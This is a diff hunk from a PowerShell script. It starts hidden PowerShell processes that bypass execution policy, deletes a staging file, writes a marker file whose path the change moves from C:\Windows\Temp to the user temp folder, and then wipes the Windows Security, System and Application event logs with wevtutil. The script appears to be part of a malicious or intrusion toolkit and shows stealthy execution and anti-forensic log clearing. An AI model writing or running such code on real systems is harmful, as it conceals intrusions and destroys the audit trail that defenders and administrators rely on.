@@ -175,7 +175,7 @@ Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidde
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-w", "hidden", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\$main'"
 
 Remove-Item -Path $initFindePath -Force -ErrorAction SilentlyContinue
-Add-Content -Path "C:\Windows\Temp\1572754491.txt" -Value "1572754491" -Force
+Add-Content -Path "$env:temp\1572754491.txt" -Value "1572754491" -Force
 wevtutil cl Security
 wevtutil cl System 
 wevtutil cl Application
